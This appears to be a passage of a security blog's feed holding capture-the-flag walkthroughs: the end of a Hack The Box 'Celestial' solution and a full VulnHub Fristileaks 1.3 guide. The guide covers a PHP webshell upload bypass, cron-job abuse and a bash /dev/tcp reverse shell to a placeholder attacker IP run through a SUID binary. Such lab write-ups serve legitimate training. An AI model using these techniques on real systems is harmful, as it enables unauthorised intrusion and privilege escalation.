&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After replacing my original cookie with the Base64 encoded tampered cookie, I got a reverse shell and the user flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="user" src="/images/ctf/htb/celestial/user.png" title="Getting user"&gt;&lt;/p&gt;
&lt;p&gt;Of immediate interest was the file &lt;strong&gt;&lt;code&gt;output.txt&lt;/code&gt;&lt;/strong&gt; which has a creation time within the last 5- or 10-minute time increment and the contents &lt;em&gt;Script is running...&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;After some observation, the creation time increments every 5 minutes exactly, indicating an automated process.
The contents of the file match the contents of the &lt;strong&gt;&lt;code&gt;echo "Script is running..."&lt;/code&gt;&lt;/strong&gt; line from a file called &lt;strong&gt;&lt;code&gt;script.py&lt;/code&gt;&lt;/strong&gt; under the &lt;strong&gt;&lt;code&gt;Documents/&lt;/code&gt;&lt;/strong&gt; directory.
Modifying the script to output a different string also modified the output file’s contents.&lt;/p&gt;
&lt;p&gt;I created a Python reverse shell and my code into &lt;strong&gt;&lt;code&gt;script.py&lt;/code&gt;&lt;/strong&gt; and set a listener on Kali.
At the next 5-minute mark, the code executed, giving me another reverse shell and the root flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="root" src="/images/ctf/htb/celestial/root.png" title="Getting root"&gt;&lt;/p&gt;</content><category term="ctf"></category><category term="hack the box"></category></entry><entry><title>Frisitleaks 1.3</title><link href="fristileaks.html" rel="alternate"></link><published>2018-12-01T00:00:00-08:00</published><updated>2018-12-01T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:None,2018-12-01:fristileaks.html</id><summary type="html">&lt;p&gt;Guide to the Fristileaks 1.3 VulnHub box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
&lt;p&gt;A small VM made for a Dutch informal hacker meetup called Fristileaks.
Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&lt;/p&gt;
&lt;h2&gt;Setup&lt;/h2&gt;
&lt;p&gt;The virtual machine requires DHCP, and you have to manually set the machine's MAC address to &lt;strong&gt;08:00:27:A5:A6:76&lt;/strong&gt;.
My setup runs on an isolated network &lt;strong&gt;10.100.100.0/24&lt;/strong&gt;, and the attacking box is at &lt;strong&gt;10.100.100.99/24&lt;/strong&gt;.
You can find the box &lt;a href="https://www.vulnhub.com/entry/fristileaks-13,133/"&gt;here&lt;/a&gt; to follow along or do yourself.&lt;/p&gt;
&lt;h1&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;First we should verify that the box is online. After, we can determine what services are running on the target.&lt;/p&gt;
&lt;h4&gt;Netdiscover&lt;/h4&gt;
&lt;p&gt;&lt;img alt="netdiscover" src="/images/ctf/fristileaks/netdiscover.png" title="Netdiscover"&gt;&lt;/p&gt;
&lt;h4&gt;Nmap&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Nmap 7.70 scan initiated  as: nmap -sC -sV -oA nmap/fristileaks 10.100.100.133
Nmap scan report for 10.100.100.133
Host is up (0.00032s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From this, we can determine that the target is running an Apache webserver on port 80.
Further scans did not reveal any other external services.&lt;/p&gt;
&lt;p&gt;Using a browser to navigate to the site reveals a colourful webpage, but nowhere obvious to go:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Fristileaks homepage" src="/images/ctf/fristileaks/homepage.png" title="Fristileaks homepage"&gt;&lt;/p&gt;
&lt;p&gt;There is very little content on this page, however nmap found a &lt;strong&gt;http-robots.txt&lt;/strong&gt; file that had some directories listed.
Viewing any of them reveals a sneaky trick, and another dead end.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Not the URL we are looking for" src="/images/ctf/fristileaks/droid.png" title="Not the URL we are looking for"&gt;&lt;/p&gt;
&lt;p&gt;Navigating to &lt;strong&gt;/admin&lt;/strong&gt; only leads to a 404 Not Found message, so we will have to input other possible directory or URI names.
Fortunately, we don't have to brute force this puzzle.
By simply going to &lt;strong&gt;/fristi&lt;/strong&gt;, one will be rewarded with a hidden admin portal asking for credentials.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Fristileaks hidden admin page" src="/images/ctf/fristileaks/adminpage.png" title="Fristileaks hidden admin page"&gt;&lt;/p&gt;
&lt;h1&gt;Exploitatin &amp;amp;&amp;amp; Gaining Access&lt;/h1&gt;
&lt;p&gt;Attempting to bypass the authentication using typical methods (such as SQLi or default creds) doesn't seem to work.
While taking a look at the page source, we find a few interesting comments.&lt;/p&gt;
&lt;p&gt;One a TODO list by &lt;strong&gt;eezeepz&lt;/strong&gt;,&lt;/p&gt;
&lt;p&gt;&lt;img alt="Comment from eezeepz" src="/images/ctf/fristileaks/admin-comment.png" title="Comment from eezeepz"&gt;&lt;/p&gt;
&lt;p&gt;and the other is Base64 encoded.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Base64 encoded something" src="/images/ctf/fristileaks/admin-base64.png" title="Base64 encoded something"&gt;&lt;/p&gt;
&lt;p&gt;Decoding the B64 text reveals a PNG image with the text &lt;strong&gt;keKkeKKeKKeKkEkkEk&lt;/strong&gt;.
Using &lt;strong&gt;eezeepz:keKkeKKeKKeKkEkkEk&lt;/strong&gt; for credentials does work, and redirects us to &lt;strong&gt;/fristi/login_success.php&lt;/strong&gt;, with a link to &lt;strong&gt;/fristi/upload.php&lt;/strong&gt;.
Progress!&lt;/p&gt;
&lt;p&gt;There are some minor restrictions.
The file uploaded must be a PNG, JPG, or GIF image.
Fortunately this is a very simple filter, and easily bypassed.&lt;/p&gt;
&lt;p&gt;Simply: locate your PHP webshell of choice (such as &lt;strong&gt;php-reverse-shell.php&lt;/strong&gt;, located in &lt;strong&gt;/usr/share/webshells/php&lt;/strong&gt; in Kali); copy it to your working directory and modify as needed; rename the file with .png appended (&lt;strong&gt;php-reverse-shell.php.png&lt;/strong&gt;); upload the shell, and navigate to &lt;strong&gt;/fristi/uploads/&lt;your-file-name-here&gt;.php.png&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Uploading webshell" src="/images/ctf/fristileaks/upload.png" title="Uploading webshell"&gt;&lt;/p&gt;
&lt;p&gt;And just like magic, we now have a shell as the &lt;strong&gt;apache&lt;/strong&gt; user account!&lt;/p&gt;
&lt;p&gt;&lt;img alt="Webshell!" src="/images/ctf/fristileaks/webshell.png" title="Webshell!"&gt;&lt;/p&gt;
&lt;h1&gt;Post-Exploitation&lt;/h1&gt;
&lt;p&gt;The apache user has very limited privileges, so we should make it our goal to quickly gain access to another user account.&lt;/p&gt;
&lt;p&gt;There are three user accounts we could compromise:&lt;/p&gt;
&lt;p&gt;&lt;img alt="User accounts" src="/images/ctf/fristileaks/home.png" title="/home"&gt;&lt;/p&gt;
&lt;p&gt;Since we don't have access to any directory but &lt;strong&gt;/home/eezeepz&lt;/strong&gt;, we will have to start there.&lt;/p&gt;
&lt;p&gt;Navigating to &lt;strong&gt;eezeepz&lt;/strong&gt;'s home directory, there is a slough of system binaries and a &lt;strong&gt;notes.txt&lt;/strong&gt; file:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Content of notes.txt" src="/images/ctf/fristileaks/notes.png" title="Content of notes.txt"&gt;&lt;/p&gt;
&lt;p&gt;The instructions are pretty straightforward.
By listing binaries using full paths in &lt;strong&gt;/usr/bin&lt;/strong&gt;, &lt;strong&gt;/home/admin&lt;/strong&gt;, and presumably &lt;strong&gt;/home/eezeepz&lt;/strong&gt; in a file called &lt;strong&gt;/tmp/runthis&lt;/strong&gt;, a cronjob will execute the binaries every minute as user &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;My solution to this was to execute &lt;strong&gt;&lt;code&gt;echo "/home/admin/chmod 707 /home/admin" &amp;gt;&amp;gt; /tmp/runthis&lt;/code&gt;&lt;/strong&gt;, which will give us read, write, and execute privileges in &lt;strong&gt;/home/admin&lt;/strong&gt; from any account.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Modifying /home/admin privileges" src="/images/ctf/fristileaks/chmod.png" title="Modifying /home/admin privileges"&gt;&lt;/p&gt;
&lt;h1&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Taking a look into the newly accessible directory reveals the previously noted system binaries, some python scripts, and two text files: &lt;strong&gt;cryptedpass.txt&lt;/strong&gt; (owned by admin) and &lt;strong&gt;whoisyourgodnow.txt&lt;/strong&gt; (owned by fristigod).&lt;/p&gt;
&lt;p&gt;The contents of the text files appear to be the output of the &lt;strong&gt;cryptpass.py&lt;/strong&gt; script.&lt;/p&gt;
&lt;p&gt;&lt;img alt="cryptedpass.txt/cryptpass.py" src="/images/ctf/fristileaks/cryptpass.png" title="The contents of cryptedpass.txt and cryptpass.py"&gt;&lt;/p&gt;
&lt;p&gt;The python script takes a string argument, encodes it in Base64, and then reverses the string and modifies it with ROT13.
This isn't encryption; it's encoding, and passwords should never be encrypted or encoded.&lt;/p&gt;
&lt;p&gt;The process is easy to reverse, especially using &lt;a href="https://github.com/gchq/CyberChef"&gt;CyberChef&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Reversing cryptedpass.txt" src="/images/ctf/fristileaks/rev-cryptedpass.png" title="Reversing cryptedpass.txt"&gt;
&lt;img alt="Reversing whoisyourgodnow.txt" src="/images/ctf/fristileaks/rev-whoisyourgodnow.png" title="Reversing whoisyourgodnow.txt"&gt;&lt;/p&gt;
&lt;p&gt;At this point I uploaded a PHP reverse shell and caught it with Ncat, as the webshell I used isn't a terminal and thus cannot use &lt;code&gt;su&lt;/code&gt; or &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="su admin" src="/images/ctf/fristileaks/su-admin.png" title="su admin"&gt;
&lt;img alt="su fristigod" src="/images/ctf/fristileaks/su-fristigod.png" title="su fristigod"&gt;&lt;/p&gt;
&lt;h1&gt;Getting Root&lt;/h1&gt;
&lt;p&gt;Despite being called admin, I determined that the account did not have sufficient rights to use sudo.
However, &lt;strong&gt;fristigod&lt;/strong&gt; has access to a single binary.&lt;/p&gt;
&lt;p&gt;&lt;img alt="One true binary" src="/images/ctf/fristileaks/fristigod-sudo-l.png" title="One true binary"&gt;&lt;/p&gt;
&lt;p&gt;Fristigod may run sudo as user &lt;strong&gt;fristi&lt;/strong&gt; to execute &lt;strong&gt;/var/fristigod/.secret_admin_stuff/doCom&lt;/strong&gt;.
So what is this doCom?
In our case, it's a SUID binary owned by root that executes shell commands that are fed to it.&lt;/p&gt;
&lt;p&gt;&lt;img alt="doCom" src="/images/ctf/fristileaks/doCom.png" title="doCom"&gt;&lt;/p&gt;
&lt;p&gt;Let's verify that it runs as root.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Testing execution" src="/images/ctf/fristileaks/exec-test.png" title="Testing execution"&gt;&lt;/p&gt;
&lt;p&gt;Excellent!&lt;/p&gt;
&lt;p&gt;This means that we can execute a simple reverse shell as root. I like using &lt;strong&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKER-IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/strong&gt; from &lt;a href="http://pentestmonkey.net/"&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Getting root" src="/images/ctf/fristileaks/get-root.png" title="Getting root"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Got root" src="/images/ctf/fristileaks/got-root.png" title="Got root"&gt;&lt;/p&gt;</content><category term="ctf"></category><category term="vulnhub"></category></entry></feed>